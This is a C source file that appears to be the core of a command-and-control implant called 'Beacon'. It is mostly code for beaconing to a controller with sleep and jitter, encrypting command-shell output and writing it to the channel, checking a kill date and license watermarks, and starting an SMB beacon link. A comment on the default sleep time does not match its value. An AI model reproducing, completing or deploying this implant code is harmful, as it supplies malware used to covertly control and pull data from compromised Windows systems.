#include "channel.h"
#include "commands.h"
#include "security.h"
#include "beacon.h"
#include "link.h"
#include "build.h"
#include "parse.h"
#include "bformat.h"
#include "client.h"

#define MAX_GET setting_int(SETTING_MAXGET)

/* default, 1 minute time between beacons */
unsigned int sleep_time = 1000 * 30 * 1;

/* jitter, a value to alter sleep time with */
unsigned int jitter = 0;

/* what we will use for posting. */
unsigned int post_type = POST_HTTP;

/* base64 encoded session metadata info */
extern sessdata bigsession;

void command_shell_post(char * buffer, int length, int type, BOOL sendNow) {
	DWORD bar = 0;

	/* encrypt+package the data => must FREE this returned pointer */
	char * cipherdata = command_shell_encrypt(buffer, length, type, &bar);
	if (bar <= 0)
		return;

	/* write some stuff out */
	client_write(cipherdata, bar);

	/* I, the caller, am responsible for freeing the command_shell_encrypt pointer! */
	free(cipherdata);
}

void command_shell_callback(char * buffer, int length, int type) {
	command_shell_post(buffer, length, type, FALSE);
}

unsigned int genagentid() {
	return bigger_rand() & 0x7FFFFFFF & ~1;
}

void beacon(LPVOID lpReserved) {
	char * buffer;
	int    length;
	unsigned int adjust = 0;

	/* what protocol are we? */
	DWORD proto       = setting_short(SETTING_PROTOCOL) & ~BEACON_PROTO_HTTPS;

	/* check the kill date */
	if (check_kill_date())
		safe_exit();

	/* 4.5+ - Validate watermark */
	if (bad_watermark())
		safe_exit();

	/* 4.5+ - Validate watermark hash */
	if (bad_watermarkHash())
		safe_exit();

	/* setup our sleep time */
	sleep_time = setting_int(SETTING_SLEEPTIME);

	/* setup our default jitter factor */
	jitter = setting_short(SETTING_JITTER);

	/* allocate our buffers */
	buffer = (char *)malloc(MAX_GET);  /* TODO don't think it is needed after agent_init call. */

	/* initialize the agent */
	agent_init(buffer, MAX_GET);

	/* kick off the SMB Beacon code */
	command_link_wait();
}